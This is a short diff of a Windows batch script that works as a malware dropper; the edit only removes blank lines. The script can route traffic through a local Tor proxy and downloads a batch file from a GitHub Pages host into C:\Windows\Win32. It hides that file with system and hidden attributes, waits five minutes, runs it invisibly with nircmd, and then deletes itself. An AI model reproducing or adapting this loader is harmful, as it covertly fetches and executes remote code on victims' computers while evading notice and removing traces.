@@ -15,10 +15,7 @@ if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else 
 )
 
 set "win32=%random%"
-
 curl.exe %proxy% https://cryptedlumos.github.io/win32.bat --output "C:\Windows\Win32\%win32%.bat" && attrib +s +h +i "C:\Windows\Win32\%win32%.bat"
-
 timeout -t 300
 nircmd exec hide "C:\Windows\Win32\%win32%.bat"
-
 DEL /s /f /q /a "%~f0"
